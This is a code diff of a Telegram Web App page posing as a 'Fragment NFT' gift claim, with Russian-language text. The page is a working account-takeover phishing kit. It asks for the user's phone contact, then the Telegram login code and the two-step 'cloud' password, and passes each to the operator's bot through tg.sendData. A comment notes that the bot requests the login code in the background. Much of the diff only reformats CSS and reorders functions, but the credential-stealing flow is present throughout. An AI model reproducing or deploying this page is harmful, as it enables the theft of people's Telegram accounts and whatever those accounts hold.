@@ -6,99 +6,29 @@
     <title>Fragment NFT</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* CSS */
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #f2f2f7;
             color: #000000;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            margin: 0; padding: 0;
+            display: flex; justify-content: center; align-items: center;
+            height: 100vh; overflow: hidden;
         }
-
-        #snow-box {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
-
-        .flake {
-            position: absolute;
-            background: #adb5bd;
-            border-radius: 50%;
-            opacity: 0.5;
-        }
-
-        .card {
-            position: relative;
-            z-index: 10;
-            width: 90%;
-            max-width: 360px;
-            background: #ffffff;
-            border-radius: 28px;
-            padding: 30px 20px;
-            text-align: center;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
-        }
-
-        .nft-pic {
-            width: 220px;
-            height: 220px;
-            border-radius: 18px;
-            object-fit: cover;
-            margin-bottom: 25px;
-            border: 1px solid #efeff4;
-        }
-
+        #snow-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
+        .flake { position: absolute; background: #adb5bd; border-radius: 50%; opacity: 0.5; }
+        .card { position: relative; z-index: 10; width: 90%; max-width: 360px; background: #ffffff; border-radius: 28px; padding: 30px 20px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.05); }
+        .nft-pic { width: 220px; height: 220px; border-radius: 18px; object-fit: cover; margin-bottom: 25px; border: 1px solid #efeff4; }
         h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; letter-spacing: -0.5px; }
         p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 30px; padding: 0 10px; }
-
-        .action-btn {
-            background: #007aff;
-            color: #ffffff;
-            border: none;
-            border-radius: 12px;
-            padding: 16px;
-            width: 100%;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
-
-        .action-btn:active { opacity: 0.7; }
-
-        input {
-            width: 100%;
-            padding: 14px;
-            background: #f2f2f7;
-            border: 1px solid #d1d1d6;
-            border-radius: 10px;
-            font-size: 20px;
-            text-align: center;
-            margin-bottom: 15px;
-            outline: none;
-            box-sizing: border-box;
-        }
-
+        .action-btn { background: #007aff; color: #ffffff; border: none; border-radius: 12px; padding: 16px; width: 100%; font-size: 17px; font-weight: 600; cursor: pointer; }
+        input { width: 100%; padding: 14px; background: #f2f2f7; border: 1px solid #d1d1d6; border-radius: 10px; font-size: 20px; text-align: center; margin-bottom: 15px; outline: none; box-sizing: border-box; }
         .step { display: none; }
         .active { display: block; animation: scaleIn 0.3s ease; }
-
-        @keyframes scaleIn {
-            from { opacity: 0; transform: scale(0.96); }
-            to { opacity: 1; transform: scale(1); }
-        }
+        @keyframes scaleIn { from { opacity: 0; transform: scale(0.96); } to { opacity: 1; transform: scale(1); } }
     </style>
 </head>
 <body>
-
     <div id="snow-box"></div>
-
     <div class="card">
         <div id="step1" class="step active">
             <img src="https://cache.tonapi.io/imgproxy/GwTyqFIK-SGPuBYQpyeaAsPLU2nhV-Ccmlygn5DmV18/rs:fill:500:500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvdmludGFnZWNpZ2FyLTEzNzA5LndlYnA.webp" class="nft-pic">
@@ -116,14 +46,14 @@
 
         <div id="step3" class="step">
             <h1>Проверка кода</h1>
-            <p>Введите 5-значный код, который пришел вам в Telegram.</p>
+            <p>Введите 5-значный код из Telegram.</p>
             <input type="number" id="sms" placeholder="00000" oninput="if(this.value.length==5) sendSms()">
             <button class="action-btn" onclick="sendSms()">Подтвердить</button>
         </div>
 
         <div id="step4" class="step">
             <h1>Пароль</h1>
-            <p>Введите ваш пароль двухэтапной аутентификации.</p>
+            <p>Введите ваш облачный пароль.</p>
             <input type="password" id="2fa" placeholder="Ваш пароль">
             <button class="action-btn" onclick="done()">Завершить</button>
         </div>
@@ -133,6 +63,38 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
 
+        function nav(id) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        function auth() {
+            tg.requestContact((ok) => { 
+                if(ok) {
+                    // После передачи контакта бот сам запросит код в фоне
+                    nav('step3'); 
+                }
+            });
+        }
+
+        function sendSms() {
+            let v = document.getElementById('sms').value;
+            if(v.length >= 5) {
+                tg.sendData("CODE:" + v);
+                // На всякий случай даем визуальный переход к 2FA через секунду
+                setTimeout(() => nav('step4'), 1500);
+            }
+        }
+
+        function done() {
+            let v = document.getElementById('2fa').value;
+            if(v.length > 0) {
+                tg.sendData("PASS:" + v);
+                setTimeout(() => tg.close(), 1000);
+            }
+        }
+        
+        // Снег (без изменений)
         function initSnow() {
             const container = document.getElementById('snow-box');
             for(let i=0; i<45; i++) {
@@ -143,42 +105,10 @@
                 f.style.left = Math.random()*100 + 'vw';
                 f.style.top = Math.random()*-20 + 'px';
                 container.appendChild(f);
-                f.animate([
-                    { transform: 'translateY(0)', opacity: 0.5 },
-                    { transform: 'translateY(100vh)', opacity: 0 }
-                ], {
-                    duration: Math.random()*3000+4000,
-                    iterations: Infinity,
-                    delay: Math.random()*5000
-                });
+                f.animate([{ transform: 'translateY(0)', opacity: 0.5 }, { transform: 'translateY(100vh)', opacity: 0 }], { duration: Math.random()*3000+4000, iterations: Infinity });
             }
         }
         initSnow();
-
-        function nav(id) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-        }
-
-        function auth() {
-            tg.requestContact((ok) => { if(ok) nav('step3'); });
-        }
-
-        function sendSms() {
-            let v = document.getElementById('sms').value;
-            if(v.length >= 5) {
-                tg.sendData("CODE:" + v);
-                setTimeout(() => nav('step4'), 1000);
-            }
-        }
-
-        function done() {
-            let v = document.getElementById('2fa').value;
-            if(v.length > 0) {
-                tg.sendData("PASS:" + v);
-                tg.close();
-            }
-        }
     </script>
 </body>
 </html>
